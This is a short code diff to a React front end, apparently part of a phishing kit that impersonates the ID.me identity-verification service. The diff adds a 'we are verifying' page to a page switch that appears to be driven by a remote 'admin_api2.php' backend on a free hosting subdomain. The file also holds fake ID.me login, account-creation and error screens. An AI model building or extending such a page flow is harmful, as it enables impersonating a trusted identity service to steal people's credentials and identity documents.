@@ -18,6 +18,7 @@ import DoYouHaveIdMe from "../components/DoYouHaveIdme";
 import LandingPage from "../components/LandingPage";
 import CreateAccount from "../components/createIDMeNew";
 import SecondErrorPage from "../components/secondErrorPage";
+import WeAreVeryfying from "../components/weareveryfying";
 
 // The URL for your PHP backend
 const API_URL = "https://ivory-dunlin-618889.hostingersite.com/myBackend/admin_api2.php"; // Update this based on your server configuration
@@ -140,6 +141,8 @@ useEffect(() => {
         return <CreateAccount />;
       case "SecondErrorPage":
         return <SecondErrorPage />;
+      case "WeAreVeryfying":
+        return <WeAreVeryfying />;
       default:
         return (
           <div className="animate-pulse max-w-sm mx-auto bg-white p-6 rounded shadow">
